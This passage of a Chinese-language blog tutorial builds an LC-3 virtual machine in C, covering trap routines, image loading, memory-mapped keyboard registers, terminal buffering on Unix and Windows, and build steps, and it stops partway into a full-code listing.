<li>程序起始地址为 <code>0x3000</code>，就是为了给陷阱例程腾出空间</li>
</ul>
<p>尽管陷阱例程可以用汇编形式编写，并且这是物理 LC-3 计算机可以执行的操作，但它并不是最适合 VM 的</p>
<p>与其编写我们自己的原始 I/O 例程，我们可以利用操作系统上可用的例程，这将使 VM 在我们的计算机上更好地运行，简化代码，并为可移植性提供更高级别的抽象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">reg[R_R7] = reg[R_PC];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (instr &amp; <span class="number">0xFF</span>) <span class="comment">/* 获取trap code */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> TRAP_GETC:</span><br><span class="line">        @&#123;TRAP GETC&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_OUT:</span><br><span class="line">        @&#123;TRAP OUT&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTS:</span><br><span class="line">        @&#123;TRAP PUTS&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_IN:</span><br><span class="line">        @&#123;TRAP IN&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTSP:</span><br><span class="line">        @&#123;TRAP PUTSP&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_HALT:</span><br><span class="line">        @&#123;TRAP HALT&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例程 PUTS：</p>
<ul>
<li>陷阱代码用于输出以 NULL 结尾的字符串（类似于 C 中的 <code>puts</code>）</li>
<li>要显示字符串，我们必须给陷阱例程一个要显示的字符串，这是通过在开始陷阱之前存储第一个字符的地址 memory 来完成的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (*c)</span><br><span class="line">    &#123;</span><br><span class="line">        putc((<span class="keyword">char</span>)*c, <span class="built_in">stdout</span>);</span><br><span class="line">        ++c;</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>LC-3 中的内存位置为16位，因此字符串中的每个字符的宽度为16位，想要使用C函数显示它，我们需要将每个值转换为 <code>char</code> 并单独输出它们</li>
</ul>
<p>其他的例程都与之类似，用C代码很好实现</p>
<p><strong>Loading programs 加载程序</strong></p>
<p>当汇编程序转换为机器代码时，结果是一个包含指令和数据数组的文件，这可以通过将内容直接复制到内存中的地址来加载</p>
<p>程序文件的前16位指定程序应启动的内存地址（此地址称为 <code>origin</code>），必须首先读取它，然后从源地址开始将其余数据从文件读取到内存中</p>
<p>以下是将 LC-3 程序读入内存的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_image_file</span><span class="params">(FILE* file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> origin;</span><br><span class="line">    fread(&amp;origin, <span class="keyword">sizeof</span>(origin), <span class="number">1</span>, file);</span><br><span class="line">    origin = swap16(origin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> max_read = MEMORY_MAX - origin;</span><br><span class="line">    <span class="keyword">uint16_t</span>* p = memory + origin;</span><br><span class="line">    <span class="keyword">size_t</span> read = fread(p, <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>), max_read, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (read-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = swap16(*p);</span><br><span class="line">        ++p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>LC-3 程序是大端序的，但大多数现代计算机都是小端序的</li>
<li>因此，我们需要调用 <code>swap16</code> 交换每个加载的内容</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">swap16</span><span class="params">(<span class="keyword">uint16_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">8</span>) | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Memory mapped registers 内存映射寄存器</strong></p>
<p>某些特殊寄存器无法从普通寄存器表访问，相反，在内存中为他们保留了一个特殊地址，要读取和写入这些寄存器，只需读取和写入它们的内存位置</p>
<ul>
<li>它们被称为内存映射寄存器 Memory mapped registers，它们通常用于与特殊硬件设备进行交互</li>
</ul>
<p>LC-3有两个需要实现的 Memory mapped registers：</p>
<ul>
<li>键盘状态寄存器 KBSR：标识键盘是“按下”还是“弹起”</li>
<li>键盘数据寄存器 KBDR：记录按下的键盘数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MR_KBSR = <span class="number">0xFE00</span>, <span class="comment">/* keyboard status */</span></span><br><span class="line">    MR_KBDR = <span class="number">0xFE02</span>  <span class="comment">/* keyboard data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Memory mapped registers 使内存访问稍微复杂一些：<ul>
<li>不能直接读取和写入内存数组，而是必须调用 <code>setter</code> 和 <code>getter</code> 函数</li>
<li>当从 KBSR 中读取内存时，<code>getter</code> 将检查键盘并更新两个内存位置</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_write</span><span class="params">(<span class="keyword">uint16_t</span> address, <span class="keyword">uint16_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">mem_read</span><span class="params">(<span class="keyword">uint16_t</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key())</span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Platform specifics 平台细节</strong></p>
<p>本节包含访问键盘和表现良好的一些繁琐细节，这些与了解 VM 没有见地或相关（随意复制粘贴）</p>
<p>这些函数应该在主函数上方声明</p>
<p>Linux/macOS/UNIX：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">original_tio</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disable_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tcgetattr(STDIN_FILENO, &amp;original_tio);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">new_tio</span> =</span> original_tio;</span><br><span class="line">    new_tio.c_lflag &amp;= ~ICANON &amp; ~ECHO;</span><br><span class="line">    tcsetattr(STDIN_FILENO, TCSANOW, &amp;new_tio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restore_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tcsetattr(STDIN_FILENO, TCSANOW, &amp;original_tio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">check_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd_set readfds;</span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;readfds);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">    timeout.tv_sec = <span class="number">0</span>;</span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> select(<span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* unix only */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>Windows：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hStdin = INVALID_HANDLE_VALUE;</span><br><span class="line">DWORD fdwMode, fdwOldMode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disable_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hStdin = GetStdHandle(STD_INPUT_HANDLE);</span><br><span class="line">    GetConsoleMode(hStdin, &amp;fdwOldMode); <span class="comment">/* save old mode */</span></span><br><span class="line">    fdwMode = fdwOldMode</span><br><span class="line">            ^ ENABLE_ECHO_INPUT  <span class="comment">/* no input echo */</span></span><br><span class="line">            ^ ENABLE_LINE_INPUT; <span class="comment">/* return when one or</span></span><br><span class="line"><span class="comment">                                    more characters are available */</span></span><br><span class="line">    SetConsoleMode(hStdin, fdwMode); <span class="comment">/* set new mode */</span></span><br><span class="line">    FlushConsoleInputBuffer(hStdin); <span class="comment">/* clear buffer */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restore_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SetConsoleMode(hStdin, fdwOldMode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">check_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WaitForSingleObject(hStdin, <span class="number">1000</span>) == WAIT_OBJECT_0 &amp;&amp; _kbhit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* windows only */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span>  <span class="comment">// _kbhit</span></span></span><br></pre></td></tr></table></figure>
<p>All platforms：</p>
<p>为了正确处理终端的输入，我们需要调整一些缓冲设置，这些平台的实现因每个平台而异，应该已在上面定义</p>
<ul>
<li>在 main 中循环开始时写入如下代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGINT, handle_interrupt); <span class="comment">/* 设置信号处理程序 */</span></span><br><span class="line">disable_input_buffering(); <span class="comment">/* 禁用输入缓冲区 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果我们收到结束程序的信号，也应该恢复设置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_interrupt</span><span class="params">(<span class="keyword">int</span> signal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    restore_input_buffering(); <span class="comment">/* 将终端设置恢复正常 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>在 main 中循环结束时写入如下代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restore_input_buffering();</span><br></pre></td></tr></table></figure>
<p>到目前为止，我们编写的所有内容都应按以下顺序添加到 C 文件中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@&#123;Includes&#125;</span><br><span class="line"></span><br><span class="line">@&#123;Registers&#125;</span><br><span class="line">@&#123;Condition Flags&#125;</span><br><span class="line">@&#123;Opcodes&#125;</span><br><span class="line"></span><br><span class="line">@&#123;Memory Mapped Registers&#125;</span><br><span class="line">@&#123;TRAP Codes&#125;</span><br><span class="line"></span><br><span class="line">@&#123;Memory Storage&#125;</span><br><span class="line">@&#123;Register Storage&#125;</span><br><span class="line"></span><br><span class="line">@&#123;Input Buffering&#125;</span><br><span class="line">@&#123;Handle Interrupt&#125;</span><br><span class="line">@&#123;Sign Extend&#125;</span><br><span class="line">@&#123;Swap&#125;</span><br><span class="line">@&#123;Update Flags&#125;</span><br><span class="line">@&#123;Read Image File&#125;</span><br><span class="line">@&#123;Read Image&#125;</span><br><span class="line">@&#123;Memory Access&#125;</span><br><span class="line"></span><br><span class="line">@&#123;Main Loop&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Running the VM 启动虚拟机</strong></p>
<p>现在可以构建并运行 LC-3 虚拟机了：</p>
<ul>
<li>编译虚拟机</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc lc3.c -o lc3-vm</span><br></pre></td></tr></table></figure>
<ul>
<li>下载 2048 或 Rogue 的组装版本</li>
<li>使用 <code>.obj</code> 文件作为参数运行 VM</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lc3-vm path/to/2048.obj</span><br></pre></td></tr></table></figure>
<p>调试 Debugging：</p>
<p>如果程序无法正常工作，则可能是因为您错误地编写了指令，调试起来可能很棘手</p>
<p>我建议通读 LC-3 程序的汇编源代码，同时使用调试器逐个执行 VM 指令，读取程序集时，请确保 VM 转到预期指令，如果出现差异，您将知道是哪个指令导致了问题，重新阅读其规范并仔细检查您的代码</p>
<p><strong>Full VM code 完整虚拟机代码</strong></p>
<p>本人只是把如下文章中的代码拼接到了一起</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.jmeiners.com/lc3-vm/#main-loop-block-17">Write your Own Virtual Machine (jmeiners.com)</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span 